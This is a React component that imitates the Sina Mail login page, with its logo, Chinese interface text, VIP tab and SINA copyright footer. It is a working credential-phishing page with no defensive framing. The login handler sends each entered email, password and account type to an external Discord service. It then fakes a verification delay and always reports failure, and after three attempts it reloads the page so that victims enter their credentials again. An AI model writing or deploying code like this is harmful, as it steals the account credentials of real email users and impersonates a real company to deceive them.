import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface SinaThemeProps {
  prefilledEmail?: string;
}

const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'free' | 'vip'>('free');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        email,
        password,
        accountType: activeTab,
        theme: 'sina',
      }, 'SinaTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-6 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <div className="flex items-center">
            {/* Sina Logo */}
            <svg width="40" height="40" viewBox="0 0 100 100" className="mr-2">
              <circle cx="50" cy="50" r="45" fill="#f00" />
              <path d="M30 50 Q50 30 70 50 T30 70" fill="white" />
              <circle cx="50" cy="50" r="10" fill="black" />
            </svg>
            <div className="flex flex-col">
               <span className="text-2xl font-bold italic tracking-tighter">sina<span className="text-gray-600 font-normal ml-2 not-italic text-lg">新浪邮箱</span></span>
            </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[12px] text-gray-500">
          <a href="#" className="hover:text-orange-500">VIP邮箱</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-orange-500">企业邮箱</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-orange-500">官方APP下载</a>
        </nav>
      </header>

      {/* Main Content Area */}
      <main className="relative flex-grow flex items-center justify-center bg-[#444] overflow-hidden min-h-[550px]">
        {/* Dark Background Pattern */}
        <div className="absolute inset-0 bg-gradient-to-b from-[#333] to-[#222]"></div>
        
        <div className="relative w-full max-w-[1200px] mx-auto px-6 flex flex-col md:flex-row items-center justify-between z-10">
          
          {/* Left Side: VIP Promotion */}
          <div className="hidden md:flex flex-col items-center text-center space-y-6 relative">
             <div className="relative group">
               {/* Card Illustration */}
               <div className="relative w-[300px] h-[180px] bg-gradient-to-br from-[#e6c17a] to-[#b8860b] rounded-xl shadow-2xl transform -rotate-6 flex flex-col p-6 text-[#5c4033] border border-white/20">
                  <div className="text-xl font-bold">VIP</div>
                  <div className="mt-auto text-[14px] opacity-80 italic">888@vip.sina.cn</div>
               </div>
               {/* Ribbons and floating elements */}
               <div className="absolute -top-10 -left-10 text-white/10 text-6xl font-black select-none">BOSS</div>
               <div className="absolute -bottom-10 -right-10 text-white/10 text-6xl font-black select-none">666</div>
               <div className="absolute top-1/2 -left-20 text-white/10 text-4xl font-black select-none">1314</div>
               <div className="absolute top-0 -right-20 text-white/10 text-4xl font-black select-none">520</div>
             </div>

             <div className="space-y-2 mt-8">
                <h2 className="text-white text-4xl font-bold flex items-center justify-center">
                   VIP邮箱 <span className="ml-3 bg-[#e6c17a] text-[#5c4033] text-sm px-3 py-1 rounded">靓号</span>
                </h2>
                <p className="text-gray-400 text-lg">您的Email地址不只是好记，更是您不凡的标记</p>
             </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[360px] bg-white rounded-md shadow-2xl overflow-hidden">
            {/* Tabs */}
            <div className="flex border-b border-gray-100 h-14">
              <button 
                onClick={() => setActiveTab('free')}
                className={`flex-1 flex items-center justify-center space-x-2 text-[14px] transition-all ${activeTab === 'free' ? 'text-[#00a6e0] font-medium' : 'text-gray-400 bg-gray-50/50'}`}
              >
                <span className="text-yellow-500">✉</span>
                <span>免费邮箱登录</span>
              </button>
              <button 
                onClick={() => setActiveTab('vip')}
                className={`flex-1 flex items-center justify-center space-x-2 text-[14px] transition-all ${activeTab === 'vip' ? 'text-[#00a6e0] font-medium' : 'text-gray-400 bg-gray-50/50'}`}
              >
                <span className="text-yellow-600">👑</span>
                <span>VIP登录</span>
              </button>
            </div>

            <form onSubmit={handleLogin} className="p-8 space-y-6">
              <div className="relative group">
                <input 
                  type="text" 
                  placeholder="输入邮箱名/手机号" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                />
              </div>

              <div className="space-y-1">
                <input 
                  type="password" 
                  placeholder="输入密码" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                />
                <div className="text-right">
                  <a href="#" className="text-[12px] text-[#00a6e0] hover:underline">忘记密码？</a>
                </div>
              </div>

              {/* Loading State */}
              {isLoading && (
                <div className="flex items-center justify-center py-8">
                  <div className="flex flex-col items-center space-y-3">
                    <div className="w-8 h-8 border-4 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
                    <p className="text-[14px] text-gray-500">正在验证...</p>
                  </div>
                </div>
              )}

              {/* Authentication Failed Message */}
              {authError && !isLoading && (
                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                  <div className="flex items-start space-x-3">
                    <div className="flex-shrink-0 text-red-500 text-xl">⚠️</div>
                    <div>
                      <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                      <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                    </div>
                  </div>
                </div>
              )}

              <div className="flex space-x-3">
                <button 
                  type="submit"
                  disabled={isLoading}
                  className="flex-1 py-2.5 bg-[#00a6e0] hover:bg-[#008dbf] text-white font-medium rounded transition-colors text-[14px] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? '验证中...' : '登录'}
                </button>
                <button 
                  type="button" 
                  className="flex-1 py-2.5 bg-white border border-gray-300 text-gray-600 hover:bg-gray-50 font-medium rounded transition-colors text-[14px]"
                >
                  注册
                </button>
              </div>

              {/* Bottom links and social */}
              <div className="flex items-center justify-between text-[11px] pt-4 border-t border-gray-50">
                <div className="flex items-center space-x-1 text-gray-500">
                  <span className="text-red-600 font-bold">👁️</span>
                  <a href="#" className="hover:text-[#00a6e0]">微博账号登录</a>
                </div>
                <div className="flex items-center space-x-1 text-[#00a6e0]">
                  <span className="scale-x-[-1]">⚡</span>
                  <a href="#" className="hover:underline">更快登录</a>
                </div>
              </div>

              <div className="flex items-center justify-between pt-4">
                 <a href="#" className="text-[#00a6e0] text-[11px] hover:underline">下载官方APP</a>
                 <div className="flex items-center bg-orange-50 px-2 py-1 rounded text-[11px] text-orange-600 border border-orange-100">
                    <span className="mr-1">🛡️</span>
                    <span>扫码登录更安全</span>
                    <div className="ml-2 w-5 h-5 bg-white border border-gray-200 flex items-center justify-center">
                       <div className="w-3 h-3 bg-black"></div>
                    </div>
                 </div>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-10 text-[11px] text-gray-500 bg-white">
        <div className="max-w-[1200px] mx-auto px-4 text-center space-y-4">
          <div className="flex flex-wrap justify-center items-center space-x-8">
            <div className="flex items-center space-x-4">
              <span>新浪公司 版权所有</span>
              <span>Copyright © 1996-2026 SINA Corporation, All Rights Reserved</span>
            </div>
          </div>
          <div className="flex flex-wrap justify-center items-center space-x-4 opacity-80">
            <a href="#" className="hover:text-orange-500">服务条款</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-orange-500">隐私政策</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-orange-500">意见反馈</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-orange-500">在线客服</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-orange-500">不良信息举报</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-orange-500">帮助</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default SinaTheme;